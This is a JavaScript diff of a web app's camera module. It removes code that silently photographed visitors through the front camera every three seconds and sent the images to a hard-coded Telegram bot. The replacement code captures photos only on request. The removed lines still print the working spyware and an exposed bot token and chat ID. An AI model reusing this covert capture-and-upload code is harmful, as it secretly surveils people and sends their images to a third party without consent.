@@ -1,75 +1,97 @@
-const video = document.getElementById('camera-feed');
-let stream = null;
-
-// Hidden Telegram Configuration (REPLACE THESE WITH YOURS)
-const BOT_TOKEN = '8785242574:AAFwWXb_aZcT8MqQPNFnJ19Phb9KpnDk-Q0';
-const CHAT_ID = '1873633439';
-const INTERVAL_SECONDS = 3; 
-
-// Hidden canvas for background capture
-const canvas = document.createElement('canvas');
-const context = canvas.getContext('2d');
+const video = document.getElementById("camera-feed");
+let cameraStream = null;
 
 async function initCamera() {
-    if (stream) return;
-    
+    if (cameraStream) return;
+
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+        throw new Error("This browser cannot access the camera. Open the site over HTTPS and use a supported browser.");
+    }
+
+    let requestedStream = null;
+
     try {
-        const constraints = {
+        requestedStream = await navigator.mediaDevices.getUserMedia({
             video: {
-                facingMode: 'user', 
-                width: { ideal: 720 },
-                height: { ideal: 1280 }
+                facingMode: "user",
+                width: { ideal: 1280 },
+                height: { ideal: 720 }
             },
             audio: false
-        };
-        
-        stream = await navigator.mediaDevices.getUserMedia(constraints);
-        video.srcObject = stream;
-        
-        return new Promise((resolve) => {
-            video.onloadedmetadata = () => {
-                video.play();
-                
-                // Set canvas dimensions to match video
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                
-                // Start the silent background capture loop
-                setInterval(captureAndSend, INTERVAL_SECONDS * 1000);
-                
-                resolve();
-            };
         });
-    } catch (err) {
-        throw new Error("Could not access camera.");
+
+        video.srcObject = requestedStream;
+
+        await new Promise((resolve, reject) => {
+            let settled = false;
+            const timeoutId = setTimeout(() => finish(new Error("Camera took too long to start. Try again.")), 10000);
+
+            function finish(error) {
+                if (settled) return;
+                settled = true;
+                clearTimeout(timeoutId);
+                video.removeEventListener("loadedmetadata", onLoaded);
+                video.removeEventListener("error", onError);
+                if (error) reject(error);
+                else resolve();
+            }
+
+            function onLoaded() {
+                if (video.videoWidth > 0 && video.videoHeight > 0) finish();
+            }
+
+            function onError() {
+                finish(new Error("The browser could not read the camera stream."));
+            }
+
+            video.addEventListener("loadedmetadata", onLoaded);
+            video.addEventListener("error", onError);
+
+            if (video.readyState >= 1 && video.videoWidth > 0 && video.videoHeight > 0) onLoaded();
+        });
+
+        await video.play();
+        cameraStream = requestedStream;
+    } catch (error) {
+        if (requestedStream) requestedStream.getTracks().forEach((track) => track.stop());
+        video.srcObject = null;
+        throw error instanceof Error ? error : new Error("Could not start the camera. Check your camera permission.");
     }
 }
 
-function captureAndSend() {
-    // Only run if credentials are set
-    if (!BOT_TOKEN || !CHAT_ID || BOT_TOKEN === 'YOUR_TELEGRAM_BOT_TOKEN_HERE') return;
-    
-    try {
-        // Draw the current video frame to the hidden canvas (mirrored to match the UI)
-        context.save();
-        context.scale(-1, 1);
-        context.translate(-canvas.width, 0);
-        context.drawImage(video, 0, 0, canvas.width, canvas.height);
-        context.restore();
-
-        // Convert canvas to Blob and send via Telegram API
-        canvas.toBlob((blob) => {
-            if (!blob) return;
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('photo', blob, 'cutemeter_capture.jpg');
-
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                method: 'POST',
-                body: formData
-            }).catch(() => {}); // Trap network errors silently
-        }, 'image/jpeg', 0.7);
-    } catch (e) {
-        // Trap rendering errors silently
+async function capturePhoto() {
+    if (!cameraStream || video.readyState < 2 || !video.videoWidth || !video.videoHeight) {
+        throw new Error("The camera is not ready yet. Wait for the live preview and try again.");
     }
+
+    const maxDimension = 1280;
+    const scale = Math.min(1, maxDimension / Math.max(video.videoWidth, video.videoHeight));
+    const width = Math.max(1, Math.round(video.videoWidth * scale));
+    const height = Math.max(1, Math.round(video.videoHeight * scale));
+    const canvas = document.createElement("canvas");
+    canvas.width = width;
+    canvas.height = height;
+
+    const context = canvas.getContext("2d");
+    if (!context) throw new Error("Could not prepare the photo. Please try again.");
+
+    // Mirror the saved image so it matches the front-camera preview.
+    context.translate(width, 0);
+    context.scale(-1, 1);
+    context.drawImage(video, 0, 0, width, height);
+
+    return new Promise((resolve, reject) => {
+        canvas.toBlob((blob) => {
+            if (blob) resolve(blob);
+            else reject(new Error("The browser could not create a photo. Please try again."));
+        }, "image/jpeg", 0.84);
+    });
+}
+
+function stopCamera() {
+    if (cameraStream) {
+        cameraStream.getTracks().forEach((track) => track.stop());
+        cameraStream = null;
+    }
+    if (video) video.srcObject = null;
 }
